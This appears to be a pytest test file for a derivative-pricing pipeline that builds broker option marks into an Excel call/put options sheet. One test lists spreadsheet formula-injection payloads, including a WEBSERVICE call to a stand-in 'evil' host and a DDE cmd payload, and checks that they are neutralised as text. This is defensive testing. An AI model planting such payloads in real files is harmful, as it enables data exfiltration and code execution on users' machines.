from derivative_pricing.adaptive.agent import SPECS_DIR, load_spec
from derivative_pricing.adaptive.engine import run_spec
from derivative_pricing.output import (
    CallOptionsOutputRow,
    build_rows_from_marks,
    option_type,
    split_marks_by_option_type,
    write_call_options_sectioned_xlsx,
)
from derivative_pricing.output.call_options_sheet import COLUMNS, _signed_shares
from derivative_pricing.schema import Broker, BrokerMark, Lineage
from derivative_pricing.workbook import read_call_options


def _mark(ref, qty, direction, price, underlying="S&P 500", mtm=1000.0):
    return BrokerMark(
        broker=Broker.BNP_PARIBAS,
        trade_ref=ref,
        mtm_local=mtm,
        currency="USD",
        extra={"quantity": qty, "direction": direction, "underlying_price": price,
               "underlying": underlying},
        lineage=Lineage(source_file="x.xls", sheet="s", row=1),
    )


def _typed_mark(ref, put_call, mtm=1000.0):
    return BrokerMark(
        broker=Broker.BNP_PARIBAS, trade_ref=ref, mtm_local=mtm, currency="USD",
        extra={"put_call": put_call, "quantity": 10.0, "strike": 6500.0,
               "underlying_price": 6500.0, "underlying": "S&P 500"},
        lineage=Lineage(source_file="x.xls", sheet="s", row=1),
    )


def test_option_type_classification():
    assert option_type(_typed_mark("A", "CALL")) == "call"
    assert option_type(_typed_mark("B", "C")) == "call"
    assert option_type(_typed_mark("C", "PUT")) == "put"
    assert option_type(_typed_mark("D", "P")) == "put"
    assert option_type(_typed_mark("E", "put")) == "put"
    # blank Call/Put (the MCB net-MTM structures) is treated as a call,
    # matching ALIC, which books those call-spreads in the Call Options sheet.
    assert option_type(_typed_mark("F", None)) == "call"


def test_split_preserves_every_mark():
    marks = [_typed_mark("c1", "CALL"), _typed_mark("p1", "PUT"),
             _typed_mark("mcb", None), _typed_mark("p2", "P")]
    calls, puts = split_marks_by_option_type(marks)
    assert len(calls) == 2 and len(puts) == 2      # c1 + mcb ; p1 + p2
    assert len(calls) + len(puts) == len(marks)     # nothing dropped
    assert {m.trade_ref for m in puts} == {"p1", "p2"}


def test_put_sheet_carries_put_label(tmp_path):
    import openpyxl

    puts = [_typed_mark("P1", "PUT", mtm=500.0)]
    rows = build_rows_from_marks(puts, fx_rates={"USD": 1.0})
    out = write_call_options_sectioned_xlsx(
        rows, tmp_path / "puts.xlsx", as_of="2026-03-31", sheet_label="Put Options")
    ws = openpyxl.load_workbook(out).active
    assert ws.title == "Put Options"
    col_a = " ".join(str(ws.cell(row=r, column=1).value or "")
                     for r in range(1, ws.max_row + 1))
    assert "ALIC Put Options" in col_a


def test_signed_shares_rule():
    assert _signed_shares(100.0, "Long") == 100.0
    assert _signed_shares(100.0, "Short") == -100.0
    assert _signed_shares(100.0, "short") == -100.0  # case-insensitive
    assert _signed_shares(100.0, None) == 100.0  # default long-ish
    assert _signed_shares(None, "Short") is None
    # magnitude from quantity, sign from direction — a pre-signed quantity
    # can't flip twice (matters for BAML's already-signed Position column)
    assert _signed_shares(-100.0, "Short") == -100.0
    assert _signed_shares(-100.0, "Long") == 100.0


def _nomura_mark(ref, qty, direction, mtm, strike=2000.0):
    # Nomura reports dealer-perspective: quantity (exchangedNotional1amount)
    # and MTM are both negated vs the client's view. `direction` is the value
    # the engine produces (Long/Short), not the raw buySell text.
    return BrokerMark(
        broker=Broker.NOMURA, trade_ref=ref, mtm_local=mtm, currency="USD",
        extra={"quantity": qty, "direction": direction, "strike": strike,
               "underlying": "RTY", "put_call": "CALL"},
        lineage=Lineage(source_file="n.xlsx", sheet="Sheet0", row=1),
    )


def test_nomura_shares_flip_to_client_view():
    """Nomura dealer-SELL -> client is long -> positive shares; dealer-BUY ->
    client short -> negative. Verified against the ALIC sheet, where shares ==
    -exchangedNotional1amount. The engine maps buySell 'SELL'->Short before
    this point, and the F3 flip (Nomura=-1) converts to the client view."""
    sell = build_rows_from_marks([_nomura_mark("N1", -571.16, "Short", 31678.55)],
                                 fx_rates={"USD": 1.0})[0]
    assert sell.shares == 571.16
    buy = build_rows_from_marks([_nomura_mark("N2", 736.00, "Long", -436075.14)],
                                fx_rates={"USD": 1.0})[0]
    assert buy.shares == -736.00


def test_nomura_shares_match_alic_end_to_end(nomura_statement_path, workbook_path):
    """Full pipeline: parsed Nomura shares equal the analyst's ALIC shares on
    every row whose statement quantity is a genuine share count (the ratio /
    magnitude-outlier notionals are correctly flagged out)."""
    import pytest
    marks = run_spec(load_spec(SPECS_DIR / "nomura.json"), nomura_statement_path)
    rows = {r.trade_reference: r for r in build_rows_from_marks(marks, {"USD": 1.0})}
    wb = read_call_options(workbook_path)
    alic = {r.trade_ref: r for r in wb.rows if r.broker == Broker.NOMURA}
    common = [ref for ref in set(rows) & set(alic)
              if rows[ref].shares is not None and alic[ref].shares is not None]
    assert len(common) > 250
    agree = sum(1 for ref in common
                if rows[ref].shares == pytest.approx(alic[ref].shares, abs=0.02))
    assert agree == len(common), f"{agree}/{len(common)} shares agree"


def test_normalized_contract_quantity_flagged_not_summed():
    """A GS normalized/notional contract (index option struck at ~$1.0) reports
    a notional in the quantity column, not shares -> excluded from shares and
    flagged. The $1.0 strike is REAL and shown as-is (it is not the flag)."""
    m = BrokerMark(
        broker=Broker.GOLDMAN_SACHS, trade_ref="SDB-NORM", mtm_local=8927.28,
        currency="USD",
        extra={"quantity": 179034.0, "direction": "Buy", "strike": 1.0,
               "underlying": ".RUT", "put_call": "Call"},
        lineage=Lineage(source_file="gs.xls", sheet="s", row=1),
    )
    # a normal-strike GS row is unaffected
    ok = BrokerMark(
        broker=Broker.GOLDMAN_SACHS, trade_ref="SDB-OK", mtm_local=5000.0,
        currency="USD",
        extra={"quantity": 92.95, "direction": "Buy", "strike": 2641.71,
               "underlying": ".SPX", "put_call": "Call"},
        lineage=Lineage(source_file="gs.xls", sheet="s", row=2),
    )
    rows = {r.trade_reference: r for r in build_rows_from_marks([m, ok], {"USD": 1.0})}
    assert rows["SDB-NORM"].shares is None
    assert rows["SDB-NORM"].shares_review and "notional" in rows["SDB-NORM"].shares_review
    # the real $1.0 strike is shown as reported, NOT blanked
    assert rows["SDB-NORM"].strike_rate == 1.0
    assert rows["SDB-OK"].shares == 92.95
    assert rows["SDB-OK"].shares_review is None
    assert rows["SDB-OK"].strike_rate == 2641.71


def test_valuation_review_narrow_flag():
    """Flag ONLY a call with no strike, no price, and no underlying. A
    structured-index trade (has an index, valued by MTM) is NOT flagged even
    with no strike/shares; a normal priced row is not flagged."""
    from derivative_pricing.output import valuation_review
    # unidentifiable: no strike, no price, no index -> flagged
    bad = CallOptionsOutputRow(
        cusip=None, index=None, trade_reference="X1", strike_rate=None,
        maturity_date=None, currency="USD", notional_local=None, notional_usd=None,
        mtm_local=15054.59, mtm_usd=15054.59, shares=None, price_local=None,
        broker="Barclays")
    assert valuation_review(bad)
    # structured-index (.BXIIGTBB): no strike/price but HAS an index -> not flagged
    structured = CallOptionsOutputRow(
        cusip=None, index=".BXIIGTBB", trade_reference="X2", strike_rate=None,
        maturity_date=None, currency="USD", notional_local=None, notional_usd=None,
        mtm_local=51008.11, mtm_usd=51008.11, shares=None, price_local=None,
        broker="Barclays")
    assert valuation_review(structured) is None
    # normal priced row -> not flagged
    normal = CallOptionsOutputRow(
        cusip=None, index=".SPX", trade_reference="X3", strike_rate=6500.0,
        maturity_date=None, currency="USD", notional_local=None, notional_usd=None,
        mtm_local=1000.0, mtm_usd=1000.0, shares=10.0, price_local=100.0,
        broker="Goldman Sachs")
    assert valuation_review(normal) is None


def test_exclusions_roundtrip(tmp_path):
    from derivative_pricing.output import exclusions as ex
    p = tmp_path / "exclusions.json"
    assert ex.load_exclusions(p) == {}
    ex.exclude("EDR31810103EU", broker="Barclays", note="analyst drops it", path=p)
    m = ex.load_exclusions(p)
    assert ex.is_excluded("EDR31810103EU", m)
    assert m["EDR31810103EU"]["broker"] == "Barclays"
    assert m["EDR31810103EU"]["note"] == "analyst drops it"
    assert not ex.is_excluded("OTHER", m)
    ex.restore("EDR31810103EU", path=p)
    assert not ex.is_excluded("EDR31810103EU", ex.load_exclusions(p))


def test_magnitude_outlier_keeps_its_real_strike():
    """A magnitude-outlier notional (Nomura exotic) has a REAL index-level
    strike -> flag shares but keep the strike (unlike ratio-strike rows)."""
    peers = [_nomura_mark(f"P{i}", 700.0 + i, "Short", 30000.0) for i in range(10)]
    outlier = _nomura_mark("BIG", 5_062_185.0, "Short", 40000.0, strike=2100.5)
    row = {r.trade_reference: r
           for r in build_rows_from_marks(peers + [outlier], {"USD": 1.0})}["BIG"]
    assert row.shares is None            # quantity flagged
    assert row.strike_rate == 2100.5     # strike is real, kept


def test_quantity_magnitude_outlier_flagged():
    """A position wildly larger than its broker peers is a notional mis-booked
    as a quantity (2 Nomura exotic rows: ~5M vs ~700 peers) -> flagged."""
    peers = [_nomura_mark(f"P{i}", 700.0 + i, "sell", 30000.0) for i in range(10)]
    outlier = _nomura_mark("BIG", 5_062_185.0, "sell", 40000.0, strike=2100.5)
    rows = {r.trade_reference: r
            for r in build_rows_from_marks(peers + [outlier], {"USD": 1.0})}
    assert rows["BIG"].shares is None
    assert rows["BIG"].shares_review and "median" in rows["BIG"].shares_review
    assert rows["P0"].shares is not None  # peers unaffected


def test_short_position_yields_negative_notional():
    rows = build_rows_from_marks(
        [_mark("S1", 10.0, "Short", 6500.0)], fx_rates={"USD": 1.0}
    )
    r = rows[0]
    assert r.shares == -10.0
    assert r.notional_local == -65000.0  # negative for short
    assert r.price_local is not None and r.price_local < 0  # mtm(+) / shares(-)


def test_long_position_positive():
    rows = build_rows_from_marks(
        [_mark("L1", 10.0, "Long", 6500.0)], fx_rates={"USD": 1.0}
    )
    assert rows[0].notional_local == 65000.0


def test_sectioned_output_has_banners_subtotals_grandtotal(tmp_path):
    import openpyxl

    marks = [
        _mark("B1", 10.0, "Long", 100.0, mtm=500.0),
        _mark("B2", 5.0, "Short", 100.0, mtm=-200.0),  # short -> negative notional
    ]
    marks[1].broker = Broker.HSBC  # force a second section
    rows = build_rows_from_marks(marks, fx_rates={"USD": 1.0})
    out = write_call_options_sectioned_xlsx(rows, tmp_path / "alic.xlsx", as_of="2026-03-31")

    ws = openpyxl.load_workbook(out).active
    col_a = [ws.cell(row=r, column=1).value for r in range(1, ws.max_row + 1)]
    text = " ".join(str(x) for x in col_a if x)
    assert "BNP Paribas" in text and "HSBC" in text          # banners
    assert "subtotal" in text.lower()                         # F7 subtotal rows
    assert "GRAND TOTAL" in text                              # F8 grand total

    # F7: notional subtotal is positive-only (short leg excluded)
    sub_row = next(r for r in range(1, ws.max_row + 1)
                   if str(ws.cell(row=r, column=1).value or "").endswith("subtotal"))
    assert ws.cell(row=sub_row, column=7).value == 1000.0  # only the long leg's notional


def test_formula_injection_neutralized_in_output(tmp_path):
    """A crafted broker statement whose trade ref is a spreadsheet formula must
    NOT be written as a live formula (CSV/formula injection). openpyxl stores a
    string starting with '=' as a real formula; Excel also evaluates +, -, @ and
    leading control chars on open. The output writer defuses these to literal
    text so opening the generated workbook can't trigger data exfil / RCE."""
    import openpyxl

    payloads = ["=WEBSERVICE(\"http://evil/\")", "+1+1", "-2+3", "@SUM(A1)",
                "=cmd|'/c calc'!A1"]
    marks = [_mark(p, 10.0, "Long", 100.0, mtm=500.0) for p in payloads]
    rows = build_rows_from_marks(marks, fx_rates={"USD": 1.0})
    out = write_call_options_sectioned_xlsx(rows, tmp_path / "inj.xlsx", as_of="2026-03-31")

    ws = openpyxl.load_workbook(out).active  # data_only defaults off -> formulas visible
    ref_col = COLUMNS.index("Trade Reference") + 1
    written = {str(ws.cell(row=r, column=ref_col).value or "")
               for r in range(1, ws.max_row + 1)}
    # every payload is present but prefixed with a quote and stored as text
    for p in payloads:
        assert ("'" + p) in written, f"{p!r} not neutralized"
    # nothing was stored as a live formula
    for r in range(1, ws.max_row + 1):
        c = ws.cell(row=r, column=ref_col)
        assert c.data_type != "f", f"row {r} stored as formula: {c.value!r}"


def test_safe_cell_leaves_legitimate_values_untouched():
    """The guard must bite only on hostile input: normal refs, indices, numbers,
    dates and None pass through byte-for-byte (a negative MTM is a float, so the
    leading '-' rule never touches it)."""
    from derivative_pricing.output.call_options_sheet import _safe_cell

    for v in ["EDR31750137EU", ".BXIIGTBB", "USD", "2026-03-31", None,
              -12345.67, 0, 6500.0]:
        assert _safe_cell(v) == v
    assert _safe_cell("=1+1") == "'=1+1"


def test_matches_alic_after_sign_fix(bnp_statement_path, workbook_path):
    """With the Long/Short sign applied, the system's Notional and Price
    reproduce the analyst's ALIC sheet for all but the manually-overridden
    trades (which also drive the MTM differences)."""
    marks = run_spec(load_spec(SPECS_DIR / "bnp.json"), bnp_statement_path)
    rows = {r.trade_reference: r
            for r in build_rows_from_marks(marks, {"USD": 1.0})}
    wb = read_call_options(workbook_path)
    alic = {r.trade_ref: r for r in wb.rows if r.broker == Broker.BNP_PARIBAS}
    common = set(rows) & set(alic)

    def close(a, b):
        if a is None or b is None:
            return False
        return abs(a - b) <= 0.02 * max(abs(a), abs(b), 1)

    notl_ok = sum(1 for ref in common if close(rows[ref].notional_local, alic[ref].notional_local))
    assert notl_ok / len(common) >= 0.90, f"notional match only {notl_ok}/{len(common)}"